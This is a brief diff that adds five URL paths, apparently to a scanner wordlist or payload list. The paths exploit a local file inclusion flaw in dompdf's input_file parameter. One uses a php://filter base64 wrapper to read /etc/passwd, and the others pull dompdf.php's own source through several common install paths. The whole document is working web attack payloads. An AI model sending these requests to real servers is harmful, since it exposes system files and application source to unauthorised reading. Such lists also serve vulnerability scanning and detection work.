@@ -1,0 +1,5 @@
+/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd
+/dompdf.php?input_file=dompdf.php
+/PhpSpreadsheet/Writer/PDF/DomPDF.php?input_file=dompdf.php
+/lib/dompdf/dompdf.php?input_file=dompdf.php
+/includes/dompdf/dompdf.php?input_file=dompdf.php
